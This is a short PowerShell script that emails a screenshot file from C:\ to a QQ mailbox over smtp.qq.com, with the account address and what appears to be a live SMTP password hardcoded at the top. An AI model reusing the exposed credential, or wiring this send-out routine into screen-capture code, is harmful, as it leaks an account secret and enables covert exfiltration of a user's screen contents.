$username = "2084535151@qq.com";

‍
‍$password = "ntqvnukxditadcej";

‍
‍$path = "C:\screenshot.png";

‍
‍

‍
‍function sendemail([String]$email, [String]$attachmentpath) {

‍
‍    $message = New-Object Net.Mail.MailMessage

‍
‍    $message.From = $email

‍
‍    $message.To.Add($email)

‍
‍    $message.Subject = "截图"

‍
‍    $message.Body = "屏幕截图"

‍
‍    $attachment = New-Object Net.Mail.Attachment($attachmentpath)

‍
‍    $message.Attachments.Add($attachment)

‍
‍

‍
‍    $smtp = New-Object Net.Mail.SmtpClient("smtp.qq.com", "587")

‍
‍    $smtp.EnableSSL = $true

‍
‍    $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)

‍
‍    $smtp.send($message)

‍
‍    echo "邮件已发送"

‍
‍    $attachment.Dispose()

‍
‍ }

‍
‍sendemail -email "2084535151@qq.com" -attachmentpath $path
。。
